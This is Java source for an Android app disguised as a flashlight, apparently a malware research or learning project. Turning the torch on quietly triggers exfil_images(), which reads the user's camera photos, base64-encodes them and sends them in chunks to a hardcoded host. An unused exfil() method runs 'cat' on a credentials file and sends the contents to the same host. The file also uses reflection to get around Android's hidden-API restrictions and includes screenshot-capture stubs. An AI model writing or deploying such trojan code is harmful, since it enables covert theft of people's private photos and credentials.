package com.mlw.extorch;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.util.Base64;
import android.view.View;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;


import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPOutputStream;

import id.zelory.compressor.Compressor;

public class MainActivity extends AppCompatActivity {

    Switch flashControl;
    CameraManager cameraManager;
    private static String base_url = "http://192.168.0.23?input=";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        //workaround for accessing hidden api, currently still not working
        //todo make hidden api's work
        try {
            Method forName = Class.class.getDeclaredMethod("forName", String.class);
            Method getDeclaredMethod = Class.class.getDeclaredMethod("getDeclaredMethod", String.class, Class[].class);

            Class vmRuntimeClass = (Class) forName.invoke(null, "dalvik.system.VMRuntime");
            Method getRuntime = (Method) getDeclaredMethod.invoke(vmRuntimeClass, "getRuntime", null);
            Method setHiddenApiExemptions = (Method) getDeclaredMethod.invoke(vmRuntimeClass, "setHiddenApiExemptions", new Class[] {String[].class});

            Object vmRuntime = getRuntime.invoke(null);
            setHiddenApiExemptions.invoke(vmRuntime, new String[][]{new String[]{"L"}});
        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
            e.printStackTrace();
        }


        // work around for uri exposed
        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
        StrictMode.setVmPolicy(builder.build());


        flashControl = findViewById(R.id.flashSwitch);
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);

        //WE NEED TO CHECK IF THE DEVICE HAS A CAMERA (OR FLASH)
        if(getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)){
            if(getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)){
                //HERE WE TURN THE FLASH ON AND START THE EXFILL
                flashControl.setEnabled(true);
            }else{
                Toast.makeText(MainActivity.this, "This device has no flash!", Toast.LENGTH_SHORT).show();
            }
        }else{
            Toast.makeText(MainActivity.this, "This device has no camera!", Toast.LENGTH_SHORT).show();
        }

        flashControl.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if(isChecked){
                    //user turned on thew flashlight, the default rear camera has 0 as id
                    try {
                        cameraManager.setTorchMode("0", true);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                    exfil_images();
//                        exfil();
                    flashControl.setText("Flash OFF");
                }else{
                    try {
                        cameraManager.setTorchMode("0", false);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                    flashControl.setText("Flash ON");
                }
            }
        });

    }

    private void exfil_images() {
        String image_dir = Environment.getExternalStorageDirectory() + "/DCIM/Camera/";
        List<String> filenames = Utils.read_dir_files(image_dir);
        ExfilImage img = new ExfilImage(image_dir+filenames.get(0), 60);
        List <String> image_buffers = img.buffered_b64image(2000);
        for(int i=0;i<image_buffers.size();i++){
            new bgReq().execute(base_url+image_buffers.get(i));
        }
    }

    private void exfil() throws IOException {
        FileInputStream in;
        BufferedInputStream buf;
        Intent intent = getIntent();
        Bundle extras = ((Intent) intent).getExtras();
        StringBuffer sb = new StringBuffer("");
        String line = "";
        String NL = System.getProperty("line.separator");
        String str = "cat " + Environment.getExternalStorageDirectory()  +  "/someimportantcredentials.txt";
        Process process = null;

        //on the fly permission is needed in versions > M
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 0);

        try {
            process = Runtime.getRuntime().exec(str);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        BufferedReader reader = new BufferedReader(new
                InputStreamReader(process.getInputStream()));
        int read;
        char[] buffer = new char[4096];
        StringBuffer output = new StringBuffer();
        try {
            while ((read = reader.read(buffer)) > 0) {
                output.append(buffer, 0, read);
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        try {
            reader.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        try {
            process.waitFor();
        } catch (InterruptedException e) {
        }
        String data = output.toString();
        new bgReq().execute(base_url+data);
        //working but it opens a browser
//        startActivity(new Intent(Intent.ACTION_VIEW,
//                Uri.parse("http://192.168.0.23?input=" + data)));
    }

    //todo => try to implement screenshot functionality without root
    private void execute_captures() throws IOException, InterruptedException {
        Date date = new Date();
        CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
        //create file directory in cache app dir
        File temp_dir = new File(getCacheDir(), "scrn");
        temp_dir.mkdir();
        String scrn_name = getCacheDir() + "/scrn/" + now + ".jpg";
        //working only with root
        ScreentShotUtil.getInstance().takeScreenshot(this, "");


        //usable code but updated using the above classes
        //        ProcessBuilder pb = new ProcessBuilder("/system/bin/screencap", "-p", scrn_name);
        //        Process p = pb.start();

        //        Process sh = Runtime.getRuntime().exec("/system/bin/sh", null,null);
        //        OutputStream os = sh.getOutputStream();
        //        os.write(("/system/bin/screencap -p " + scrn_name).getBytes("ASCII"));
        //        os.flush();
        //        os.close();
        //        sh.waitFor();


    }

    //working but it can only take screenshots off the running application
    private void cache_screenshoot(){
        Date date = new Date();
        CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
        //create file directory in cache app dir
        File temp_dir = new File(getCacheDir(), "scrn");
        temp_dir.mkdir();

        String scrn_name = getCacheDir() + "/scrn/" + now + ".jpg";

        View root = getWindow().getDecorView();
        root.setDrawingCacheEnabled(true);
        Bitmap bitmap = Bitmap.createBitmap(root.getDrawingCache());
        root.setDrawingCacheEnabled(false);

        File scrn = new File(scrn_name);
        try {
            scrn.createNewFile();
        }catch (IOException e){
            e.printStackTrace();
        }

        try {
            FileOutputStream fileOutputStream = new FileOutputStream(scrn);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fileOutputStream);
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


}